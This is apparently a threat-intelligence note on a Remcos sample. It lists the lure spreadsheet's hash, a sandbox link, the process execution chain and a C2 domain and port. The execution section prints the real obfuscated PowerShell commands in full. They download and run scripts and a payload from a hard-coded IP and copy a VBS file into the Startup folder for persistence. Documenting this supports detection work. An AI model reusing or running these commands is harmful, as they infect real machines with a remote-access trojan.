remcos | 2022.08.18
# --------------------------------------------------------- #
# ------------------------ SOURCE ------------------------- #
# --------------------------------------------------------- #
.xls 	-	4bf076e9acdf892c344401fd3ce2ae5eefad2d7cb241ae7d25a99d9528d06812


# --------------------------------------------------------- #
# -------------------- SANDBOX REPORT/S ------------------- #
# --------------------------------------------------------- #
https://private.tria.ge/220818-rky5tspswf


# --------------------------------------------------------- #
# ---------------------- PERSISTENCE ---------------------- #
# --------------------------------------------------------- #



# --------------------------------------------------------- #
# ----------------------- EXECUTION ----------------------- #
# --------------------------------------------------------- #
C:\Program Files\Microsoft Office\Root\Office16\EXCEL.EXE
"C:\Program Files\Microsoft Office\Root\Office16\EXCEL.EXE" "C:\Users\Admin\AppData\Local\Temp\Payment Advice.xls"

    C:\Windows\System32\WScript.exe
    "C:\Windows\System32\WScript.exe" "C:\Users\Admin\AppData\Roaming\sShlx.js" 

        C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
        "C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe"  $ErrorActionPreference = 'SilentlyContinue' ;$t56fg = [Enum]::ToObject([System.Net.SecurityProtocolType], 3072);[System.Net.ServicePointManager]::SecurityProtocol = $t56fg;$we22='eW.teN tc' + 'ejbO-weN('; $b4df='olnwoD.)tnei' + 'lCb'; $c3=')''sbv.nun\''+pmet:vne$,''sbv.sunis/31.02.721.902//:ptth''(eliFda';$TC=$c3,$b4df,$we22 -Join '';IEX($TC|% {-join($_[-1..-$_.Length])});start-process($env:temp+ '\nun.vbs');remove-item ($env:appdata + '\sShlx.js')

            C:\Windows\System32\WScript.exe
            "C:\Windows\System32\WScript.exe" "C:\Users\Admin\AppData\Local\Temp\nun.vbs" 

            C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
            "C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe" $gf=(00100100,01000101,01110010,01110010,01101111,01110010,01000001,01100011,01110100,01101001,01101111,01101110,01010000,01110010,01100101,01100110,01100101,01110010,01100101,01101110,01100011,01100101,00100000,00111101,00100000,00100111,01010011,01101001,01101100,01100101,01101110,01110100,01101100,01111001,01000011,01101111,01101110,01110100,01101001,01101110,01110101,01100101,00100111,00111011,00100100,01110100,00110101,00110110,01100110,01100111,00100000,00111101,00100000,01011011,01000101,01101110,01110101,01101101,01011101,00111010,00111010,01010100,01101111,01001111,01100010,01101010,01100101,01100011,01110100,00101000,01011011,01010011,01111001,01110011,01110100,01100101,01101101,00101110,01001110,01100101,01110100,00101110,01010011,01100101,01100011,01110101,01110010,01101001,01110100,01111001,01010000,01110010,01101111,01110100,01101111,01100011,01101111,01101100,01010100,01111001,01110000,01100101,01011101,00101100,00100000,00110011,00110000,00110111,00110010,00101001,00111011,01011011,01010011,01111001,01110011,01110100,01100101,01101101,00101110,01001110,01100101,01110100,00101110,01010011,01100101,01110010,01110110,01101001,01100011,01100101,01010000,01101111,01101001,01101110,01110100,01001101,01100001,01101110,01100001,01100111,01100101,01110010,01011101,00111010,00111010,01010011,01100101,01100011,01110101,01110010,01101001,01110100,01111001,01010000,01110010,01101111,01110100,01101111,01100011,01101111,01101100,00100000,00111101,00100000,00100100,01110100,00110101,00110110,01100110,01100111,00111011,01000001,01100100,01100100,00101101,01010100,01111001,01110000,01100101,00100000,00101101,01000001,01110011,01110011,01100101,01101101,01100010,01101100,01111001,01001110,01100001,01101101,01100101,00100000,01001101,01101001,01100011,01110010,01101111,01110011,01101111,01100110,01110100,00101110,01010110,01101001,01110011,01110101,01100001,01101100,01000010,01100001,01110011,01101001,01100011,00111011,01100100,01101111,00100000,01111011,00100100,01110000,01101001,01101110,01100111,00100000,00111101,00100000,01110100,01100101,01110011,01110100,00101101,01100011,01101111,01101110,01101110,01100101,01100011,01110100,01101001,01101111,01101110,00100000,00101101,01100011,01101111,01101101,01110000,00100000,01100111,01101111,01101111,01100111,01101100,01100101,00101110,01100011,01101111,01101101,00100000,00101101,01100011,01101111,01110101,01101110,01110100,00100000,00110001,00100000,00101101,01010001,01110101,01101001,01100101,01110100,01111101,00100000,01110101,01101110,01110100,01101001,01101100,00100000,00101000,00100100,01110000,01101001,01101110,01100111,00101001,00111011,00100100,01110100,01110100,01111001,00111101,01010000,00101000,00100111,00101000,01001110,01100101,01110111,00101101,00100111,00101011,00100111,01001111,01100010,01101010,01100101,00100111,00101011,00100111,01100011,01110100,00100000,01001110,01100101,00100111,00101011,00100111,01110100,00101110,01010111,01100101,00100111,00101011,00100111,01100010,01000011,01101100,01101001,00100111,00101011,00100111,01100101,01101110,01110100,00101001,00100111,00101001,00111011,00100100,01101101,01110110,00111101,00100000,01011011,01001101,01101001,01100011,01110010,01101111,01110011,01101111,01100110,01110100,00101110,01010110,01101001,01110011,01110101,01100001,01101100,01000010,01100001,01110011,01101001,01100011,00101110,01001001,01101110,01110100,01100101,01110010,01100001,01100011,01110100,01101001,01101111,01101110,01011101,00111010,00111010,01000011,01100001,01101100,01101100,01000010,01111001,01101110,01100001,01101101,01100101,00101000,00100100,01110100,01110100,01111001,00101100,00100111,01000100,01101111,01110111,01101110,00100111,00100000,00101011,00100000,00100111,01101100,01101111,01100001,01100100,00100111,00100000,00101011,00100000,00100111,01010011,01110100,01110010,00100111,00100000,00101011,00100000,00100111,01101001,01101110,01100111,00100111,00101100,01011011,01001101,01101001,01100011,01110010,01101111,01110011,01101111,01100110,01110100,00101110,01010110,01101001,01110011,01110101,01100001,01101100,01000010,01100001,01110011,01101001,01100011,00101110,01000011,01100001,01101100,01101100,01010100,01111001,01110000,01100101,01011101,00111010,00111010,01001101,01100101,01110100,01101000,01101111,01100100,00101100,00100111,01101000,01110100,01110100,01110000,00100111,00100000,00101011,00100000,00100111,00111010,00101111,00101111,00110010,00110000,00111001,00101110,00110001,00110010,00110111,00101110,00110010,00110000,00101110,00110001,00110011,00101111,01101011,01101001,01110011,01110011,00101110,01101010,01110000,01100111,00100111,00101001,01111100,01010000) | %{ [System.Text.Encoding]::UTF8.GetString([System.Convert]::ToInt32($_,2)) };$o00='ZE000'.replace('Z','I').replace('000','x');sal P $o00;([system.String]::Join('', $gf))|P

            C:\WINDOWS\syswow64\calc.exe
            "C:\WINDOWS\syswow64\calc.exe"

        C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
        "C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe" Move-item 'C:\Users\Admin\AppData\Local\Temp\nun.vbs' -Destination 'C:\Users\Admin\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\nun.vbs'

C:\Program Files\Internet Explorer\iexplore.exe
"C:\Program Files\Internet Explorer\iexplore.exe" -Embedding

    C:\Program Files (x86)\Internet Explorer\IEXPLORE.EXE
    "C:\Program Files (x86)\Internet Explorer\IEXPLORE.EXE" SCODEF:4632 CREDAT:82945 /prefetch:2


# --------------------------------------------------------- #
# -------------------------- C2s -------------------------- #
# --------------------------------------------------------- #
topboysully.dvrlists.com:10171
